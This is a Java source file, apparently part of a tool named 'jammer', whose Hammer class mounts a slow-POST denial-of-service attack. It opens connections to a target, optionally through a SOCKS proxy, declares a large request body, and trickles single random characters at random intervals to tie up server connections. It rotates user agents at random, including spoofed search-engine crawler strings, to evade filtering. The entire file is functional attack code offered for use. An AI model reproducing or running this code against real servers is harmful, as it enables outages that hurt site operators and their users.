package com.redpois0n.jammer;

import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.Socket;
import java.net.SocketAddress;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class Hammer implements Runnable {
	
	public static final String[] USERAGENTS = new String[] { "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
		"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)", "Googlebot/2.1 (http://www.googlebot.com/bot.html)", 
		"Opera/9.20 (Windows NT 6.0; U; en)", "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)",
		"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)", 
		"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0",
		"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16", 
		"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13", 
		"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)",
		"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", 
		"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)", 
		"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)",
		"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)", 
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8", 
		"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7", 
		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
		"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)", 
		"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)", 
	};
	
	public static final List<Hammer> THREADS = new ArrayList<Hammer>();
	
	private String address;
	private int port;
	
	private boolean proxy;
	private String phost;
	private int pport;
	
	private int delay;
	
	private Socket socket;
	
	public Hammer(String address, int port, boolean proxy, String phost, int pport, int delay) {
		this.address = address;
		this.port = port;
		this.proxy = proxy;
		this.phost = phost;
		this.pport = pport;
		this.delay = delay;
	}

	@Override
	public void run() {
		while (Main.running) {
			try {				
				if (proxy) {
					SocketAddress addr = new InetSocketAddress(phost, pport);
					Proxy proxy = new Proxy(Proxy.Type.SOCKS, addr);
					socket = new Socket(proxy);
					InetSocketAddress dest = new InetSocketAddress(address, port);
					socket.connect(dest);
				} else {
					socket = new Socket(address, port);
				}
				
				OutputStream os = socket.getOutputStream();
				
				String useragent = getRandomUserAgent();
				
				os.write(("POST / HTTP/1.1\r\n" +
	                    "Host: " + address + "\r\n" +
	                    "User-Agent: " + useragent + "\r\n" +
	                    "Connection: keep-alive\r\n" +
	                    "Keep-Alive: 900\r\n" +
	                    "Content-Length: 10000\r\n" +
	                    "Content-Type: application/x-www-form-urlencoded\r\n\r\n").getBytes());
				
				while (Main.running && !socket.isClosed()) {
					os.write((randomChar()).getBytes());
					Thread.sleep(new Random().nextInt(delay));
				}
				
				socket.close();
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		};
	}
	
	public static String getRandomUserAgent() {
		return USERAGENTS[new Random().nextInt(USERAGENTS.length)];
	}
	
	public static String randomChar() {
		String chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
		
		return Character.toString(chars.charAt(new Random().nextInt(chars.length())));
	}

	public Socket getSocket() {
		return socket;
	}

}
